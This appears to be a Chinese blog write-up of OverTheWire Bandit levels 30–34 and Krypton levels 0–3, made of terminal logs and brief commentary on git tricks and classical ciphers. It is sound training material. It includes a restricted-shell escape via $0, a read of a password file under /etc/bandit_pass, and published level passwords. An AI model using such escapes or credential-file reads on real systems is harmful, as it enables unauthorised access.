ssh://bandit30-git@localhost/home/bandit30-git/repo fetch = +refs/heads/*:refs/remotes/origin/* [branch \"master\"] remote = origin merge = refs/heads/master bandit30@bandit:/tmp/b30r/repo$ git branch -a * master remotes/origin/HEAD -\u003e origin/master remotes/origin/master bandit30@bandit:/tmp/b30r/repo$ ls .git branches description hooks info objects refs config HEAD index logs packed-refs bandit30@bandit:/tmp/b30r/repo$ cat .git/description Unnamed repository; edit this file 'description' to name the repository. bandit30@bandit:/tmp/b30r/repo$ git status On branch master Your branch is up-to-date with 'origin/master'. nothing to commit, working tree clean bandit30@bandit:/tmp/b30r/repo$ git diff --cache error: invalid option: --cache bandit30@bandit:/tmp/b30r/repo$ git diff --cached bandit30@bandit:/tmp/b30r/repo$ git diff bandit30@bandit:/tmp/b30r/repo$ git diff HEAD bandit30@bandit:/tmp/b30r/repo$ git show-ref 3aa4c239f729b07deb99a52f125893e162daac9e refs/heads/master 3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/HEAD 3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/master f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret bandit30@bandit:/tmp/b30r/repo$ git show f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea47e603bb428404d265f59c42920d81e5 bandit30@bandit:/tmp/b30r/repo$    https://cloud.tencent.com/developer/section/1138782\nhttps://www.softwhy.com/article-8540-1.html\ngit show-ref：查看本地引用\n 得到了奇奇怪怪的新知识了\nlevel 32 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86  bandit31@bandit:~$ mkdir /tmp/b31r bandit31@bandit:~$ cd /tmp/b31r bandit31@bandit:/tmp/b31r$ git clone ssh://bandit31-git@localhosthome/bandit31-git/repo Cloning into 'repo'... ssh: Could not resolve hostname localhosthome: No address associated with hostname fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. bandit31@bandit:/tmp/b31r$ ls bandit31@bandit:/tmp/b31r$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo Cloning into 'repo'... Could not create directory '/home/bandit31/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit31-git@localhost's password: remote: Counting objects: 4, done. remote: Compressing objects: 100% (3/3), done. remote: Total 4 (delta 0), reused 0 (delta 0) Receiving objects: 100% (4/4), done. bandit31@bandit:/tmp/b31r$ cd repo bandit31@bandit:/tmp/b31r/repo$ ls README.md bandit31@bandit:/tmp/b31r/repo$ cat README.md This time your task is to push a file to the remote repository. Details: File name: key.txt Content: 'May I come in?' Branch: master bandit31@bandit:/tmp/b31r/repo$ touch key.txt bandit31@bandit:/tmp/b31r/repo$ echo 'May I come in?' \u003e\u003e key.txt bandit31@bandit:/tmp/b31r/repo$ cat key.txt May I come in? bandit31@bandit:/tmp/b31r/repo$ git add key.txt The following paths are ignored by one of your .gitignore files: key.txt Use -f if you really want to add them. bandit31@bandit:/tmp/b31r/repo$ git add -f key.txt bandit31@bandit:/tmp/b31r/repo$ ls -al total 24 drwxr-sr-x 3 bandit31 root 4096 Feb 26 04:47 . drwxr-sr-x 3 bandit31 root 4096 Feb 26 04:46 .. drwxr-sr-x 8 bandit31 root 4096 Feb 26 04:48 .git -rw-r--r-- 1 bandit31 root 6 Feb 26 04:46 .gitignore -rw-r--r-- 1 bandit31 root 15 Feb 26 04:47 key.txt -rw-r--r-- 1 bandit31 root 147 Feb 26 04:46 README.md bandit31@bandit:/tmp/b31r/repo$ cat .gitignore *.txt bandit31@bandit:/tmp/b31r/repo$ git commit -m \"Hello\" [master de012c9] Hello 1 file changed, 1 insertion(+) create mode 100644 key.txt bandit31@bandit:/tmp/b31r/repo$ git push Could not create directory '/home/bandit31/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit31-git@localhost's password: Counting objects: 3, done. Delta compression using up to 4 threads. Compressing objects: 100% (2/2), done. Writing objects: 100% (3/3), 319 bytes | 0 bytes/s, done. Total 3 (delta 0), reused 0 (delta 0) remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done! Here is the password for the next level: remote: 56a9bf19c63d650ce78e6ec0354ee45e remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: To ssh://localhost/home/bandit31-git/repo ! [remote rejected] master -\u003e master (pre-receive hook declined) error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo' bandit31@bandit:/tmp/b31r/repo$   这一关目的通过README可看到，是需要push到远程仓库，这对我们再熟悉不过了\n不过，这有个坑就是.gitignore，里面忽略了*.txt\n用git add -f或删掉.gitignore都行，然后push上去，这操作太骚了，改写了git push失败的返回结果，在结果里给出了flag\nlevel 33 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109  bl@bl-virtual-machine:~/wargame$ ssh bandit32@bandit.labs.overthewire.org -p 2220This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit32@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | ' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to Steven or morla on irc.overthewire.org. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! WELCOME TO THE UPPERCASE SHELL \u003e\u003e #!/bin/sh \u003e\u003e bash sh: 1: BASH: not found \u003e\u003e man sh: 1: MAN: not found \u003e\u003e sh sh: 1: SH: not found \u003e\u003e $0$ls uppershell $id uid=11033(bandit33) gid=11032(bandit32) groups=11032(bandit32) $pwd /home/bandit32 $cat /etc/bandit_pass/bandit32 cat: /etc/bandit_pass/bandit32: Permission denied $cat /etc/bandit_pass/bandit33 c9c3199ddf4121b10cf581a98d51caee $  这关是真的骚，Linux中大小写严格区分，导致我们的命令都执行不了\n后来看题解得知$0可以直接进入sh，然后就可以了woc\n还有一个题解是利用ssh协议，传一个bash脚本(如下)，放在tmp文件夹下，用大写文件名./TEST逃逸，然后执行bash，不过还是没有上面这个办法简单暴力\n#!/bin/bash bash level 34 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102  bl@bl-virtual-machine:~/wargame$ ssh bandit33@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit33@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | ' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to Steven or morla on irc.overthewire.org. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! bandit33@bandit:~$ls README.txt bandit33@bandit:~$cat README.txt Congratulations on solving the last level of this game! At this moment, there are no more levels to play in this game. However, we are constantly working on new levels and will most likely expand this game with more levels soon. Keep an eye out for an announcement on our usual communication channels! In the meantime, you could play some of our other wargames. If you have an idea for an awesome new level, please let us know! bandit33@bandit:~$  只有一个README.txt，恭喜完结撒花\n截图纪念一下\n 以下是后面找到的一些题解\nhttps://blog.csdn.net/winkar/article/details/38408873?locationNum=5\u0026fps=1\nhttps://www.freebuf.com/column/181443.html\nhttps://www.jianshu.com/p/bf8cc6b0efd1\n  Krypton  SSH Information Host: krypton.labs.overthewire.org Port: 2222\n level 0 Welcome to Krypton! The first level is easy. The following string encodes the password using Base64: S1JZUFRPTklTR1JFQVQ= Use this password to log in to krypton.labs.overthewire.org with username krypton1 using SSH on port 2222. You can find the files for other levels in /krypton/ 啊这熟悉的开头，简单的base64编码\nKRYPTONISGREAT 解码得到如上flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  $ ssh krypton1@krypton.labs.overthewire.org -p 2222 The authenticity of host '[krypton.labs.overthewire.org]:2222 ([176.9.9.172]:2222)' can't be established. ECDSA key fingerprint is SHA256:SCySwNrZFEHArEX1cAlnnaJ5gz2O8VEigY9X80nFWUU. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '[krypton.labs.overthewire.org]:2222,[176.9.9.172]:2222' (ECDSA) to the list of known hosts. _ _ | | ___ __ _ _ _ __ | |_ ___ _ __ | |/ / '__| | | | '_ \\| __/ _ \\| '_ \\ | \u003c| | | |_| | |_) | || (_) | | | | |_|\\_\\_| \\__, | .__/ \\__\\___/|_| |_| |___/|_| a http://www.overthewire.org wargame. krypton1@krypton.labs.overthewire.org's password: Permission denied, please try again. krypton1@krypton.labs.overthewire.org's password: Permission denied, please try again. krypton1@krypton.labs.overthewire.org's password: Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-92-generic x86_64) * Documentation: https://help.ubuntu.com/ The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. krypton1@krypton:~$   成功连上level1\nlevel 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  krypton1@krypton:~$ ls -al total 24 drwxr-xr-x 3 krypton1 krypton1 4096 Feb 27 11:03 . drwxr-xr-x 10 root root 4096 Feb 27 11:03 .. -rw-r--r-- 1 krypton1 krypton1 220 Apr 9 2014 .bash_logout -rw-r--r-- 1 krypton1 krypton1 3637 Apr 9 2014 .bashrc drwx------ 2 krypton1 krypton1 4096 Feb 27 11:03 .cache -rw-r--r-- 1 krypton1 krypton1 675 Apr 9 2014 .profile krypton1@krypton:~$ cd /krypton/ krypton1@krypton:/krypton$ ls krypton1 krypton2 krypton3 krypton4 krypton5 krypton6 krypton1@krypton:/krypton$ ls krypton1 README krypton2 krypton1@krypton:/krypton$ cat krypton1/README Welcome to Krypton! This game is intended to give hands on experience with cryptography and cryptanalysis. The levels progress from classic ciphers, to modern, easy to harder. Although there are excellent public tools, like cryptool,to perform the simple analysis, we strongly encourage you to try and do these without them for now. We will use them in later excercises. ** Please try these levels without cryptool first ** The first level is easy. The password for level 2 is in the file 'krypton2'. It is 'encrypted' using a simple rotation called ROT13. It is also in non-standard ciphertext format. When using alpha characters for cipher text it is normal to group the letters into 5 letter clusters, regardless of word boundaries. This helps obfuscate any patterns. This file has kept the plain text word boundaries and carried them to the cipher text. Enjoy! krypton1@krypton:/krypton$ cat krypton1/krypton2 YRIRY GJB CNFFJBEQ EBGGRA krypton1@krypton:/krypton$   通过README可知，简单的ROT13加密\nLEVEL TWO PASSWORD ROTTEN 进入下一关\nlevel 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76  krypton2@krypton:~$ ls krypton2@krypton:~$ cd /krypton/ krypton2@krypton:/krypton$ cd krypton2 krypton2@krypton:/krypton/krypton2$ ls README encrypt keyfile.dat krypton3 krypton2@krypton:/krypton/krypton2$ cat README Krypton 2 ROT13 is a simple substitution cipher. Substitution ciphers are a simple replacement algorithm. In this example of a substitution cipher, we will explore a 'monoalphebetic' cipher. Monoalphebetic means, literally, \"one alphabet\" and you will see why. This level contains an old form of cipher called a 'Caesar Cipher'. A Caesar cipher shifts the alphabet by a set number. For example: plain: a b c d e f g h i j k ... cipher: G H I J K L M N O P Q ... In this example, the letter 'a' in plaintext is replaced by a 'G' in the ciphertext so, for example, the plaintext 'bad' becomes 'HGJ' in ciphertext. The password for level 3 is in the file krypton3. It is in 5 letter group ciphertext. It is encrypted with a Caesar Cipher. Without any further information, this cipher text may be difficult to break. You do not have direct access to the key, however you do have access to a program that will encrypt anything you wish to give it using the key. If you think logically, this is completely easy. One shot can solve it! Have fun. Additional Information: The `encrypt` binary will look for the keyfile in your current working directory. Therefore, it might be best to create a working direcory in /tmp and in there a link to the keyfile. As the `encrypt` binary runs setuid `krypton3`, you also need to give `krypton3` access to your working directory. Here is an example: krypton2@melinda:~$ mktemp -d /tmp/tmp.Wf2OnCpCDQ krypton2@melinda:~$ cd /tmp/tmp.Wf2OnCpCDQ krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ln -s /krypton/krypton2/keyfile.dat krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls keyfile.dat krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ chmod 777 . krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ /krypton/krypton2/encrypt /etc/issue krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls ciphertext keyfile.dat krypton2@krypton:/krypton/krypton2$ krypton2@krypton:/krypton/krypton2$ mktemp -d /tmp/tmp.fz9I1hQd5d krypton2@krypton:/krypton/krypton2$ cd /tmp/tmp.fz9I1hQd5d krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ln -s /krypton/krypton2/keyfile.dat krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls keyfile.dat krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ chmod 777 . krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ /krypton/krypton2/encrypt /etc/issue krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls ciphertext keyfile.dat krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat ciphertext GNGZFGXFEZX krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat keyfile.dat cat: keyfile.dat: Permission denied krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls -al total 12 drwxrwxrwx 2 krypton2 krypton2 4096 Feb 27 11:19 . drwxrwx-wt 3 root root 4096 Feb 27 11:20 .. -rw-rw-r-- 1 krypton3 krypton2 11 Feb 27 11:19 ciphertext lrwxrwxrwx 1 krypton2 krypton2 29 Feb 27 11:18 keyfile.dat -\u003e /krypton/krypton2/keyfile.dat krypton2@krypton:/tmp/tmp.fz9I1hQd5d$   将密文GNGZFGXFEZX进行凯撒位移\nHOHAGHYGFAY IPIBHIZHGBZ JQJCIJAIHCA KRKDJKBJIDB LSLEKLCKJEC MTMFLMDLKFD NUNGMNEMLGE OVOHNOFNMHF PWPIOPGONIG QXQJPQHPOJH RYRKQRIQPKI SZSLRSJRQLJ TATMSTKSRMK UBUNTULTSNL VCVOUVMUTOM WDWPVWNVUPN XEXQWXOWVQO YFYRXYPXWRP ZGZSYZQYXSQ AHATZARZYTR BIBUABSAZUS CJCVBCTBAVT DKDWCDUCBWU ELEXDEVDCXV FMFYEFWEDYW GNGZFGXFEZX 发现果然好像没有可读的，再看看README原来这是个示例（我好蠢\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat /etc/issue Ubuntu 14.04.5 LTS \\n \\l krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls /krypton/krypton2/krypton3 /krypton/krypton2/krypton3 krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls /krypton/krypton2/ -al total 32 drwxr-xr-x 2 root root 4096 Nov 4 05:21 . drwxr-xr-x 8 root root 4096 Nov 4 05:21 .. -rw-r----- 1 krypton2 krypton2 1815 Nov 4 05:21 README -rwsr-x--- 1 krypton3 krypton2 8970 Nov 4 05:21 encrypt -rw-r----- 1 krypton3 krypton3 27 Nov 4 05:21 keyfile.dat -rw-r----- 1 krypton2 krypton2 13 Nov 4 05:21 krypton3 krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls ciphertext keyfile.dat krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ rm -f ciphertext krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ /krypton/krypton2/encrypt /krypton/krypton2/krypton3 krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls ciphertext keyfile.dat krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat ciphertext AYCQYPGQCYQW krypton2@krypton:/tmp/tmp.fz9I1hQd5d$   重新用krypton3被加载，解密，得到CAESARISEASY\nBZDRZQHRDZRX CAESARISEASY DBFTBSJTFBTZ ECGUCTKUGCUA FDHVDULVHDVB GEIWEVMWIEWC HFJXFWNXJFXD IGKYGXOYKGYE JHLZHYPZLHZF KIMAIZQAMIAG LJNBJARBNJBH MKOCKBSCOKCI NLPDLCTDPLDJ OMQEMDUEQMEK PNRFNEVFRNFL QOSGOFWGSOGM RPTHPGXHTPHN SQUIQHYIUQIO TRVJRIZJVRJP USWKSJAKWSKQ VTXLTKBLXTLR WUYMULCMYUMS XVZNVMDNZVNT YWAOWNEOAWOU ZXBPXOFPBXPV AYCQYPGQCYQW 得到flag进入下一关\nlevel 3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  krypton3@krypton:~$ ls krypton3@krypton:~$ cd /krypton/krypton3 krypton3@krypton:/krypton/krypton3$ ls HINT1 HINT2 README found1 found2 found3 krypton4 krypton3@krypton:/krypton/krypton3$ cat README Well done. You've moved past an easy substitution cipher. Hopefully you just encrypted the alphabet a plaintext to fully expose the key in one swoop. The main weakness of a simple substitution cipher is repeated use of a simple key. In the previous exercise you were able to introduce arbitrary plaintext to expose the key. In this example, the cipher mechanism is not available to you, the attacker. However, you have been lucky. You have intercepted more than one message. The password to the next level is found in the file 'krypton4'. You have also found 3 other files. (found1, found2, found3) You know the following important details: - The message plaintexts are in English (*** very important) - They were produced from the same key (*** even better!) Enjoy. krypton3@krypton:/krypton/krypton3$ cat found1 CGZNL YJBEN QYDLQ ZQSUQ NZCYD SNQVU BFGBK GQUQZ QSUQN UZCYD SNJDS UDCXJ ZCYDS NZQSU QNUZB WSBNZ QSUQN UDCXJ CUBGS BXJDS UCTYV SUJQG WTBUJ KCWSV LFGBK GSGZN LYJCB GJSZD GCHMS UCJCU QJLYS BXUMA UJCJM JCBGZ CYDSN CGKDC ZDSQZ DVSJJ SNCGJ DSYVQ CGJSO JCUNS YVQZS WALQV SJJSN UBTSX COSWG MTASN BXYBU CJCBG UWBKG JDSQV YDQAS JXBNS OQTYV SKCJD QUDCX JBXQK BMVWA SNSYV QZSWA LWAKB MVWAS ZBTSS QGWUB BGJDS TSJDB WCUGQ TSWQX JSNRM VCMUZ QSUQN KDBMU SWCJJ BZBTT MGCZQ JSKCJ DDCUE SGSNQ VUJDS SGZNL YJCBG UJSYY SNXBN TSWAL QZQSU QNZCY DSNCU BXJSG CGZBN YBNQJ SWQUY QNJBX TBNSZ BTYVS OUZDS TSUUM ZDQUJ DSICE SGNSZ CYDSN QGWUJ CVVDQ UTBWS NGQYY VCZQJ CBGCG JDSNB JULUJ STQUK CJDQV VUCGE VSQVY DQASJ UMAUJ CJMJC BGZCY DSNUJ DSZQS UQNZC YDSNC USQUC VLANB FSGQG WCGYN QZJCZ SBXXS NUSUU SGJCQ VVLGB ZBTTM GCZQJ CBGUS ZMNCJ LUDQF SUYSQ NSYNB WMZSW TBUJB XDCUF GBKGK BNFAS JKSSG QGWDC USQNV LYVQL UKSNS TQCGV LZBTS WCSUQ GWDCU JBNCS UESGN SUDSN QCUSW JBJDS YSQFB XUBYD CUJCZ QJCBG QGWQN JCUJN LALJD SSGWB XJDSU COJSS GJDZS GJMNL GSOJD SKNBJ STQCG VLJNQ ESWCS UMGJC VQABM JCGZV MWCGE DQTVS JFCGE VSQNQ GWTQZ ASJDZ BGUCW SNSWU BTSBX JDSXC GSUJS OQTYV SUCGJ DSSGE VCUDV QGEMQ ESCGD CUVQU JYDQU SDSKN BJSJN QECZB TSWCS UQVUB FGBKG QUNBT QGZSU QGWZB VVQAB NQJSW KCJDB JDSNY VQLKN CEDJU TQGLB XDCUY VQLUK SNSYM AVCUD SWCGS WCJCB GUBXI QNLCG EHMQV CJLQG WQZZM NQZLW MNCGE DCUVC XSJCT SQGWC GJKBB XDCUX BNTSN JDSQJ NCZQV ZBVVS QEMSU YMAVC UDSWJ DSXCN UJXBV CBQZB VVSZJ SWSWC JCBGB XDCUW NQTQJ CZKBN FUJDQ JCGZV MWSWQ VVAMJ JKBBX JDSYV QLUGB KNSZB EGCUS WQUUD QFSUY SQNSU krypton3@krypton:/krypton/krypton3$ cat found2 QVJDB MEDGB QJJSG WQGZS NSZBN WUXBN JDSYS NCBWU MNICI STBUJ ACBEN QYDSN UQENS SJDQJ UDQFS UYSQN SKQUS WMZQJ SWQJJ DSFCG EUGSK UZDBB VCGUJ NQJXB NWQXN SSUZD BBVZD QNJSN SWCGQ ABMJQ HMQNJ SNBXQ TCVSX NBTDC UDBTS ENQTT QNUZD BBVUI QNCSW CGHMQ VCJLW MNCGE JDSSV CPQAS JDQGS NQAMJ JDSZM NNCZM VMTKQ UWCZJ QJSWA LVQKJ DNBME DBMJS GEVQG WQGWJ DSUZD BBVKB MVWDQ ISYNB ICWSW QGCGJ SGUCI SSWMZ QJCBG CGVQJ CGENQ TTQNQ GWJDS ZVQUU CZUQJ JDSQE SBXUD QFSUY SQNST QNNCS WJDSL SQNBV WQGGS DQJDQ KQLJD SZBGU CUJBN LZBMN JBXJD SWCBZ SUSBX KBNZS UJSNC UUMSW QTQNN CQESV CZSGZ SBGGB ISTAS NJKBB XDQJD QKQLU GSCED ABMNU YBUJS WABGW UJDSG SOJWQ LQUUM NSJLJ DQJJD SNSKS NSGBC TYSWC TSGJU JBJDS TQNNC QESJD SZBMY VSTQL DQISQ NNQGE SWJDS ZSNST BGLCG UBTSD QUJSU CGZSJ DSKBN ZSUJS NZDQG ZSVVB NQVVB KSWJD STQNN CQESA QGGUJ BASNS QWBGZ SCGUJ SQWBX JDSMU MQVJD NSSJC TSUQG GSUYN SEGQG ZLZBM VWDQI SASSG JDSNS QUBGX BNJDC UUCOT BGJDU QXJSN JDSTQ NNCQE SUDSE QISAC NJDJB QWQME DJSNU MUQGG QKDBK QUAQY JCUSW BGTQL JKCGU UBGDQ TGSJQ GWWQM EDJSN RMWCJ DXBVV BKSWQ VTBUJ JKBLS QNUVQ JSNQG WKSNS AQYJC USWBG XSANM QNLDQ TGSJW CSWBX MGFGB KGZQM USUQJ JDSQE SBXQG WKQUA MNCSW BGQME MUJQX JSNJD SACNJ DBXJD SJKCG UJDSN SQNSX SKDCU JBNCZ QVJNQ ZSUBX UDQFS UYSQN SMGJC VDSCU TSGJC BGSWQ UYQNJ BXJDS VBGWB GJDSQ JNSUZ SGSCG ASZQM USBXJ DCUEQ YUZDB VQNUN SXSNJ BJDSL SQNUA SJKSS GQGWQ UUDQF SUYSQ NSUVB UJLSQ NUACB ENQYD SNUQJ JSTYJ CGEJB QZZBM GJXBN JDCUY SNCBW DQISN SYBNJ SWTQG LQYBZ NLYDQ VUJBN CSUGC ZDBVQ UNBKS UDQFS UYSQN SUXCN UJACB ENQYD SNNSZ BMGJS WQUJN QJXBN WVSES GWJDQ JUDQF SUYSQ NSXVS WJDSJ BKGXB NVBGW BGJBS UZQYS YNBUS ZMJCB GXBNW SSNYB QZDCG EQGBJ DSNSC EDJSS GJDZS GJMNL UJBNL DQUUD QFSUY SQNSU JQNJC GEDCU JDSQJ NCZQV ZQNSS NTCGW CGEJD SDBNU SUBXJ DSQJN SYQJN BGUCG VBGWB GRBDG QMANS LNSYB NJSWJ DQJUD QFSUY SQNSD QWASS GQZBM GJNLU ZDBBV TQUJS NUBTS JKSGJ CSJDZ SGJMN LUZDB VQNUD QISUM EESUJ SWJDQ JUDQF SUYSQ NSTQL DQISA SSGST YVBLS WQUQU ZDBBV TQUJS NALQV SOQGW SNDBE DJBGB XVQGZ QUDCN SQZQJ DBVCZ VQGWB KGSNK DBGQT SWQZS NJQCG KCVVC QTUDQ FSUDQ XJSCG DCUKC VVGBS ICWSG ZSUMA UJQGJ CQJSU UMZDU JBNCS UBJDS NJDQG DSQNU QLZBV VSZJS WQXJS NDCUW SQJD krypton3@krypton:/krypton/krypton3$ cat found3 DSNSM YBGVS ENQGW QNBUS KCJDQ ENQIS QGWUJ QJSVL QCNQG WANBM EDJTS JDSAS SJVSX NBTQE VQUUZ QUSCG KDCZD CJKQU SGZVB USWCJ KQUQA SQMJC XMVUZ QNQAQ SMUQG WQJJD QJJCT SMGFG BKGJB GQJMN QVCUJ UBXZB 